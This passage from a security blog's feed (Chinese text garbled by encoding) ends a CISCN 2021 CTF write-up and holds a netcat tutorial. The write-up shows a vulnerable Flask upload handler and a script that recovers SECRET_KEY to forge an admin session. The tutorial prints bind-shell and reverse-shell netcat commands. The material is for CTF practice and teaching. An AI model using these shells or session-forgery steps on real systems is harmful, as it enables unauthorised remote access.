class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç¬¬äº”æ­¥"><a href="#ç¬¬äº”æ­¥" class="headerlink" title="ç¬¬äº”æ­¥"></a>ç¬¬äº”æ­¥</h4><p>æŸ¥çœ‹ä»£ç å‘ç°secret=secret.secretï¼Œå¯ä»¥çŸ¥é“flagåº”è¯¥æ˜¯åœ¨<code>secret.py</code>æ–‡ä»¶é‡Œï¼Œå¦‚æœè½¯é“¾æ¥ç›´æ¥è¯»å– ï¼Œå‘ç°è¿˜æ˜¯æç¤º<code>you are not admin</code> ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æŒ‰ç…§å‰é¢çš„åˆ†æ é€šè¿‡æ‰¾<code>SECRET_KEY</code> æ¥è§£å†³ï¼Œå› ä¸º python randomç”Ÿæˆçš„æ•°ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ï¼Œè€Œæ˜¯ä¼ªéšæœºæ•°ï¼Œåˆ©ç”¨ä¼ªéšæœºæ•°çš„ç‰¹æ€§ï¼Œåªè¦ç§å­æ˜¯ä¸€æ ·çš„ï¼Œåé¢äº§ç”Ÿçš„éšæœºæ•°å€¼ä¹Ÿæ˜¯ä¸€è‡´çš„ã€‚ </p><p>æŸ¥çœ‹ä»£ç å¯çŸ¥é€šè¿‡<code>uuid.getnode()</code>å‡½æ•° è·å–ç½‘å¡macåœ°å€å¹¶è½¬æ¢æˆåè¿›åˆ¶æ•°è¿”å› ï¼Œé‚£ä¹ˆæ€è·¯å°±å˜æˆäº†å…ˆè·å–æœåŠ¡å™¨çš„ç½‘å¡macåœ°å€æ¥ç¡®å®šç§å­ï¼Œè¿›è€Œç¡®å®š<code>SECRET_KEY</code>ï¼Œä»è€Œä¼ªé€ <code>session</code> </p><p> å› ä¸ºlinuxä¸­ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¯»<code>/sys/class/net/eth0/address</code>æ–‡ä»¶å¾—åˆ°macåœ°å€</p><p>ç„¶å æŠŠmacåœ°å€å¤„ç†ä¸‹ï¼Œè½¬æ¢æˆ10è¿›åˆ¶ï¼Œç„¶åè®¾ç½®æˆseedï¼Œç”Ÿæˆ <code>SECRET_KEY</code>ï¼Œä¸‹é¢æ˜¯è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><h4 id="ç¬¬å…­æ­¥"><a href="#ç¬¬å…­æ­¥" class="headerlink" title="ç¬¬å…­æ­¥"></a>ç¬¬å…­æ­¥</h4><p>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡keyè·å–adminçš„sessionï¼Œå¯ä»¥é€šè¿‡flask-session-cookie-managerè„šæœ¬ä¹Ÿå¯ä»¥</p><p>è‡ªå·±æ­ä¸ªç®€å•çš„flaskç¯å¢ƒæ¥è·å¾—sessionå€¼ï¼Œç„¶åå¯ä»¥é€šè¿‡bpæ”¹åŒ…ç­‰ç­‰æ–¹å¼ä¿®æ”¹sessionå€¼å¾—åˆ°flag</p><h3 id="é•œåƒçš„æ‰“åŒ…"><a href="#é•œåƒçš„æ‰“åŒ…" class="headerlink" title="é•œåƒçš„æ‰“åŒ…"></a>é•œåƒçš„æ‰“åŒ…</h3><p>æ²¡å•¥å¥½è¯´çš„ï¼Œsaveä¸€ä¸‹ï¼Œè¿™æ¬¡çŠ¯äº†ä¸ªé”™è¯¯æ˜¯ä¸€å¼€å§‹æ‰“åŒ…æˆtarï¼Œè€Œå®˜æ–¹è¦æ±‚æ˜¯tar.gzå¯¼è‡´é˜Ÿå‹å¯¼å…¥çš„æ—¶å€™æ²¡å¯¼å…¥è¿›å»</p><h2 id="break-amp-fixé˜¶æ®µ"><a href="#break-amp-fixé˜¶æ®µ" class="headerlink" title="break&amp;fixé˜¶æ®µ"></a>break&amp;fixé˜¶æ®µ</h2><h3 id="breaké˜¶æ®µ"><a href="#breaké˜¶æ®µ" class="headerlink" title="breaké˜¶æ®µ"></a>breaké˜¶æ®µ</h3><p>0è§£ï¼Œå¤ªèœäº†ï¼Œç­‰å®˜æ–¹wpä¹‹åå†çœ‹çœ‹å¤ç°æ›´æ–°è¡¥å……ä¸€ä¸‹</p><h3 id="fixé˜¶æ®µ"><a href="#fixé˜¶æ®µ" class="headerlink" title="fixé˜¶æ®µ"></a>fixé˜¶æ®µ</h3><p>fixé˜¶æ®µæš´éœ²è‡ªå·±ä¸€ä¸ªæ¯”è¾ƒå¤§çš„çŸ­æ¿ï¼Œå°±æ˜¯å¯¹javawebå®Œå…¨ä¸äº†è§£ï¼Œä¹Ÿå°±å¯¼è‡´ï¼Œå¯¹äºjavaçš„é‚£é“é¢˜å®Œå…¨æ— ä»ä¸‹æ‰‹ï¼Œæœ€ååªèƒ½å¯¹æ¯”è¾ƒç†Ÿæ‚‰çš„ä¸¤é“pythonflaské¢˜å…¥æ‰‹ï¼Œå¯¹äºweb1å¢åŠ äº†é»‘åå•å†…å®¹ï¼Œå‡ ä¹æŠŠæ‰€æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ç‰¹æ®Šå­—ç¬¦éƒ½banäº†ï¼Œæœ€åä¹Ÿæ˜¯è¿™é“é¢˜è¿‡äº†checkã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN2021å†³èµ›æ€»ç»“&quot;&gt;&lt;a href=&quot;#CISCN2021å†³èµ›æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;CISCN2021å†³èµ›æ€»ç»“&quot;&gt;&lt;/a&gt;CISCN2021å†³èµ›æ€»ç»“&lt;/h1&gt;&lt;p&gt;ç®—æ˜¯é˜Ÿä¼ä¸»åŠ›å¸ˆå…„å…¨éƒ¨æ¯•ä¸šï¼ŒåŠ ä¸Š18çº§é˜Ÿå‘˜ç›¸å¯¹æ–­å±‚æƒ…å†µ</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="æ€»ç»“" scheme="http://www.fxizenta.design/categories/ctf/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="æ€»ç»“" scheme="http://www.fxizenta.design/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•</title>
    <link href="http://www.fxizenta.design/2021/07/11/nc-introudion/"/>
    <id>http://www.fxizenta.design/2021/07/11/nc-introudion/</id>
    <published>2021-07-11T14:04:42.000Z</published>
    <updated>2021-07-23T09:08:15.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•"><a href="#ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•"></a>ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•</h1><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>ncå…¨åNetCatï¼Œæœ‰Windowså’ŒLinuxçš„ç‰ˆæœ¬ï¼Œå› ä¸ºçŸ­å°ã€åŠŸèƒ½å®ç”¨ï¼Œè¢«è®¾è®¡ä¸ºä¸€ä¸ªç®€å•ã€å¯é çš„ç½‘ç»œå·¥å…·ï¼Œå¯ä»¥é€šè¿‡TCPæˆ–UDPåè®®ä¼ è¾“è¯»å†™æ•°æ®ï¼ŒåŒæ—¶ï¼Œä»–è¿˜æ˜¯ä¸€ä¸ªç½‘ç»œåº”ç”¨DEbugåˆ†æå™¨ã€‚</p><p>é€šå¸¸Linuxå‘è¡Œç‰ˆä¸­éƒ½å¸¦æœ‰NetCat</p><p>å‚è€ƒè¿æ¥ï¼š<a href="https://blog.csdn.net/zhangxiao93/article/details/52705642">Linuxã€€nc å‘½ä»¤è¯¦è§£_ä¸Šå–„è‹¥æ°´-CSDNåšå®¢_ncå‘½ä»¤</a></p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nc</span><br><span class="line">rpm -q nc</span><br></pre></td></tr></table></figure><h1 id="å‚æ•°ç®€ä»‹"><a href="#å‚æ•°ç®€ä»‹" class="headerlink" title="å‚æ•°ç®€ä»‹"></a>å‚æ•°ç®€ä»‹</h1><p>è¯­ã€€ã€€æ³•ï¼šnc [-hlnruz][-g&lt;ç½‘å…³â€¦&gt;][-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;][-i&lt;å»¶è¿Ÿç§’æ•°&gt;][-o&lt;è¾“å‡ºæ–‡ä»¶&gt;][-p&lt;é€šä¿¡ç«¯å£&gt;][-s&lt;æ¥æºåœ°å€&gt;][-vâ€¦][-w&lt;è¶…æ—¶ç§’æ•°&gt;][ä¸»æœºåç§°][é€šä¿¡ç«¯å£â€¦]</p><p>è¡¥å……è¯´æ˜ï¼šæ‰§è¡Œæœ¬æŒ‡ä»¤å¯è®¾ç½®è·¯ç”±å™¨çš„ç›¸å…³å‚æ•°ã€‚</p><p>å‚ã€€ã€€æ•°ï¼š</p><ul><li>-g&lt;ç½‘å…³&gt; è®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªã€‚</li><li>-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt; è®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ã€‚</li><li>-h åœ¨çº¿å¸®åŠ©ã€‚</li><li>-i&lt;å»¶è¿Ÿç§’æ•°&gt; è®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ã€‚</li><li>-l ä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç®¡æ§ä¼ å…¥çš„èµ„æ–™ã€‚</li><li>-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ã€‚</li><li>-o&lt;è¾“å‡ºæ–‡ä»¶&gt; æŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ã€‚</li><li>-p&lt;é€šä¿¡ç«¯å£&gt; è®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ã€‚</li><li>-r ä¹±æ•°æŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£ã€‚</li><li>-s&lt;æ¥æºåœ°å€&gt; è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ã€‚</li><li>-u ä½¿ç”¨UDPä¼ è¾“åè®®ã€‚</li><li>-v æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚</li><li>-w&lt;è¶…æ—¶ç§’æ•°&gt; è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ã€‚</li><li>-z ä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚</li></ul><h1 id="ç®€å•ä½¿ç”¨ç¤ºä¾‹"><a href="#ç®€å•ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ç®€å•ä½¿ç”¨ç¤ºä¾‹"></a>ç®€å•ä½¿ç”¨ç¤ºä¾‹</h1><h2 id="èŠå¤©"><a href="#èŠå¤©" class="headerlink" title="èŠå¤©"></a>èŠå¤©</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pc1ï¼šnc -l port</span><br><span class="line">pc2ï¼šnc ip port </span><br></pre></td></tr></table></figure><h2 id="è¿œç¨‹æ‹·è´æ–‡ä»¶"><a href="#è¿œç¨‹æ‹·è´æ–‡ä»¶" class="headerlink" title="è¿œç¨‹æ‹·è´æ–‡ä»¶"></a>è¿œç¨‹æ‹·è´æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pc1</span><br><span class="line">nc -l port &gt; 1234.txt</span><br><span class="line"></span><br><span class="line">pc2</span><br><span class="line">nc -w 1 ip port &lt; abc.txt</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ç”±pc2åˆ°pc1</p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -w 1 ip -z port-port</span><br></pre></td></tr></table></figure><h2 id="ä¿å­˜Webé¡µé¢"><a href="#ä¿å­˜Webé¡µé¢" class="headerlink" title="ä¿å­˜Webé¡µé¢"></a>ä¿å­˜Webé¡µé¢</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> nc -l -p 80 -q 1 &lt; somepage.html; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="æ¨¡æ‹ŸHTTP-Headers"><a href="#æ¨¡æ‹ŸHTTP-Headers" class="headerlink" title="æ¨¡æ‹ŸHTTP Headers"></a>æ¨¡æ‹ŸHTTP Headers</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hatest1 ~]<span class="comment"># nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser</span></span><br><span class="line">HTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]</span><br></pre></td></tr></table></figure><h1 id="ncå‘½ä»¤çš„ä½¿ç”¨å®ä¾‹"><a href="#ncå‘½ä»¤çš„ä½¿ç”¨å®ä¾‹" class="headerlink" title="ncå‘½ä»¤çš„ä½¿ç”¨å®ä¾‹"></a>ncå‘½ä»¤çš„ä½¿ç”¨å®ä¾‹</h1><h2 id="åŠ å¯†ç½‘ç»œå‘é€çš„æ•°æ®"><a href="#åŠ å¯†ç½‘ç»œå‘é€çš„æ•°æ®" class="headerlink" title="åŠ å¯†ç½‘ç»œå‘é€çš„æ•°æ®"></a>åŠ å¯†ç½‘ç»œå‘é€çš„æ•°æ®</h2><p>æœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> localhost [port] | mcrypt â€“flush â€“bare -F -q -d -m ecb &gt; file.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨mcryptå·¥å…·åŠ å¯†æ•°æ®</p><p>å®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mcrypt</span> â€“flush â€“bare -F -q -m ecb &lt; file.txt | nc -l [port]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨mcryptå·¥å…·è§£å¯†æ•°æ®</p><p>è¯·ç¡®ä¿ä¸¤ç«¯ä½¿ç”¨ç›¸åŒçš„å¯†ç </p><h2 id="æµè§†é¢‘"><a href="#æµè§†é¢‘" class="headerlink" title="æµè§†é¢‘"></a>æµè§†é¢‘</h2><p>é¦–å…ˆè¯´æ˜è¿™ä¸ªä¸æ˜¯ç”Ÿæˆæµè§†é¢‘çš„æœ€å¥½æ–¹æ³•ï¼Œä½†å¦‚æœæœåŠ¡å™¨ä¸Šæ²¡æœ‰ç‰¹å®šçš„å·¥å…·ï¼Œä½¿ç”¨ncä¹Ÿå¯ä»¥å®Œæˆã€‚</p><p>æœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat video.avi | nc -l [port]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä»ä¸€ä¸ªè§†é¢‘æ–‡ä»¶ä¸­è¯»å…¥å¹¶é‡å®šå‘è¾“å‡ºåˆ°netcatå®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip [port] | mplayer -vo x11 -cache 3000 -</span><br></pre></td></tr></table></figure><h2 id="å…‹éš†ä¸€ä¸ªè®¾å¤‡"><a href="#å…‹éš†ä¸€ä¸ªè®¾å¤‡" class="headerlink" title="å…‹éš†ä¸€ä¸ªè®¾å¤‡"></a>å…‹éš†ä¸€ä¸ªè®¾å¤‡</h2><p>å¦‚æœä½ æƒ³é…ç½®ä¸€ä¸ªæ–°linuxæœºå™¨ï¼Œè€Œä½ ä¸æƒ³åœ¨é‡å¤é…ç½®ä¸€éï¼Œåªéœ€è¦å¯åŠ¨å¦ä¸€å°æœºå™¨çš„ä¸€äº›å¼•å¯¼å¯ä»¥å…‹éš†ä½ çš„æœºå™¨ã€‚</p><p>å‡è®¾ç³»ç»Ÿåœ¨/dev/sdaä¸Š</p><p>Server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/sda | nc -l [port]</span><br></pre></td></tr></table></figure><p>Client</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n [ip] [port] | dd of=/dev/sda</span><br></pre></td></tr></table></figure><p>ddæ˜¯ä¸€ä¸ªä»ç£ç›˜ä¸­è¯»å–åŸå§‹æ•°æ®çš„å·¥å…·ï¼Œé€šè¿‡ncæœåŠ¡å™¨é‡å®šå‘å®ƒçš„è¾“å‡ºæµ</p><p>åˆ°å…¶ä»–æœºå™¨å¹¶ä¸”å†™å…¥åˆ°ç£ç›˜ä¸­ï¼Œå®ƒä¼šéšç€åˆ†åŒºè¡¨æ‹·è´æ‰€æœ‰çš„ä¿¡æ¯ã€‚</p><h2 id="æ‰“å¼€ä¸€ä¸ªshell"><a href="#æ‰“å¼€ä¸€ä¸ªshell" class="headerlink" title="æ‰“å¼€ä¸€ä¸ªshell"></a>æ‰“å¼€ä¸€ä¸ªshell</h2><p>è¿œç¨‹shellï¼ˆä¾‹å¦‚telnetå’Œsshï¼‰ä½†æ˜¯å¦‚æœé¶æœºæ²¡æœ‰ï¼Œè€Œä¸”æˆ‘ä»¬æ²¡æœ‰å®‰è£…æƒé™ä¹Ÿå¯ä»¥ä½¿ç”¨netcatåˆ›å»ºè¿œç¨‹shell</p><p>ç›®æ ‡æœºï¼ˆæœåŠ¡æœºï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l [port] -e /bin/bash -i</span><br></pre></td></tr></table></figure><p>å®¢æˆ·æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> [ip] [port]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªnetcatæœåŠ¡å™¨å¹¶ä¸”è¡¨ç¤ºå½“å®ƒè¿æ¥æˆåŠŸæ—¶æ‰§è¡Œ/bin/bashå‡å¦‚netcatä¸æ”¯æŒ-cæˆ–è€…-eå‚æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å»ºç«‹èµ·è¿œç¨‹shell</p><p>ç›®æ ‡æœºï¼ˆæœåŠ¡æœºï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/tmp_fifo</span><br><span class="line">cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªfifoæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ç®¡é“å‘½ä»¤æŠŠè¿™ä¸ªfifoæ–‡ä»¶å†…å®¹å®šå‘åˆ°shell 2&gt; &amp;1ä¸­ã€‚æ˜¯ç”¨æ¥é‡å®šå‘æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºï¼Œç„¶åç®¡é“åˆ°netcatè¿è¡Œçš„ç«¯å£1567ä¸Šï¼Œè‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æŠŠnetcatçš„è¾“å‡ºå®šå‘åˆ°fifoæ–‡ä»¶ä¸­</p><p><strong>è¿‡ç¨‹è¯¦è§£</strong></p><p>ä»ç½‘è·¯æ”¶åˆ°çš„è¾“å…¥å†™é“fifoæ–‡ä»¶ä¸­â†’catå‘½ä»¤è¯»å–fifoæ–‡ä»¶å¹¶ä¸”å…¶å†…å®¹å‘é€ç»™shå‘½ä»¤â†’shå‘½ä»¤è¿›ç¨‹å—åˆ°è¾“å…¥å¹¶ä¸”æŠŠå®ƒå†™å›åˆ°netcatâ†’netcatç½‘ç»œå‘é€ç»™å®¢æˆ·æœº</p><p>å®¢æˆ·æœºæ“ä½œåŒä¸Š</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ctferå¸¸ç”¨æ“ä½œ</p><p>æœåŠ¡ç«¯ç«¯è¿›è¡Œç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l [port]</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åˆ™åœ¨ncè¿æ¥åæ‰§è¡Œshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] [port] -e /bin/bash</span><br></pre></td></tr></table></figure><p>åå¼¹shellå¸¸ç”¨äºç»•è¿‡é˜²ç«å¢™çš„é™åˆ¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•&quot;&gt;&lt;a href=&quot;#ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•&quot;&gt;&lt;/a&gt;ncçš„ç®€ä»‹ä»¥åŠå¸¸è§ä½¿ç”¨æ–¹æ³•&lt;/h1&gt;&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; cla</summary>
      
    
    
    
    <category term="åŸºç¡€å­¦ä¹ " scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="linux" scheme="http://www.fxizenta.design/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn_webåå—èµ›åŒºwp</title>
    <link href="http://www.fxizenta.design/2021/07/10/ciscn2021hn/"/>
    <id>http://www.fxizenta.design/2021/07/10/ciscn2021hn/</id>
    <published>2021-07-10T12:09:43.000Z</published>
    <updated>2021-07-23T09:06:50.795Z</updated>
    
